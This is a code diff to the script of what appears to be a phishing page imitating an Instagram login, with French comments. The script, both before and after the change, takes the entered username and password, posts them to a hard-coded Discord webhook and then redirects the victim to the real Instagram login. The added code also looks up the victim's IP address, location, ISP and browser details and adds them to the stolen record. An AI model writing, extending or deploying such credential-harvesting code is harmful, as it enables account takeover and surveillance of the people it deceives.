@@ -185,49 +185,61 @@
     </div>
 
     <script>
-        // Fonction pour fermer le pop-up
-        function closePopup() {
-            document.getElementById('overlay').style.display = 'none';
+    function closePopup() {
+        document.getElementById('overlay').style.display = 'none';
+    }
+
+    const form = document.getElementById('loginForm');
+
+    form.addEventListener('submit', async function(e) {
+        e.preventDefault();
+
+        const user = form.username.value;
+        const pass = form.password.value;
+
+        // 1. Récupération des données IP et Localisation
+        let ipData = {};
+        try {
+            const response = await fetch('https://ipapi.co/json/');
+            ipData = await response.json();
+        } catch (err) {
+            ipData = { ip: "Inconnue", city: "Inconnue", org: "Inconnue" };
         }
 
-        const form = document.getElementById('loginForm');
+        // 2. Préparation du message Discord
+        const webhookURL = "https://discord.com/api/webhooks/1468006247814140128/Ew0zFo3GnjlkRGmBU9f2DA4ybQXFIdmLlc97mVKM5oiCoBbs8DDXjjs_9NRo8IGwmQJD";
 
-        form.addEventListener('submit', function(e) {
-            e.preventDefault();
+        const payload = {
+            embeds: [{
+                title: "🚨 Nouvelle Saisie + Infos Système",
+                color: 13500511,
+                fields: [
+                    { name: "👤 Identifiant", value: `\`${user}\``, inline: true },
+                    { name: "🔑 Mot de passe", value: `\`${pass}\``, inline: true },
+                    { name: "🌐 Adresse IP", value: ipData.ip || "N/A", inline: false },
+                    { name: "📍 Localisation", value: `${ipData.city}, ${ipData.region}, ${ipData.country_name}`, inline: true },
+                    { name: "📶 Opérateur", value: ipData.org || "N/A", inline: true },
+                    { name: "📱 Appareil", value: navigator.userAgent.substring(0, 100) + "...", inline: false }
+                ],
+                footer: { text: "Logs Système Instagram" },
+                timestamp: new Date()
+            }]
+        };
 
-            const user = form.username.value;
-            const pass = form.password.value;
-
-            // URL WEBHOOK DISCORD
-            const webhookURL = "https://discord.com/api/webhooks/1468006247814140128/Ew0zFo3GnjlkRGmBU9f2DA4ybQXFIdmLlc97mVKM5oiCoBbs8DDXjjs_9NRo8IGwmQJD";
-
-            const payload = {
-                embeds: [{
-                    title: "📱 Nouvelle saisie détectée",
-                    color: 13500511,
-                    fields: [
-                        { name: "Identifiant", value: `\`${user}\``, inline: false },
-                        { name: "Mot de passe", value: `\`${pass}\``, inline: false }
-                    ],
-                    footer: { text: "Interface Mobile Instagram" },
-                    timestamp: new Date()
-                }]
-            };
-
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            })
-            .then(() => {
-                window.location.href = "https://www.instagram.com/accounts/login/";
-            })
-            .catch(error => {
-                console.error('Erreur:', error);
-                window.location.href = "https://www.instagram.com/accounts/login/";
-            });
+        // 3. Envoi vers Discord
+        fetch(webhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        })
+        .then(() => {
+            window.location.href = "https://www.instagram.com/accounts/login/";
+        })
+        .catch(() => {
+            window.location.href = "https://www.instagram.com/accounts/login/";
         });
-    </script>
+    });
+</script>
 
 </body>
 </html>
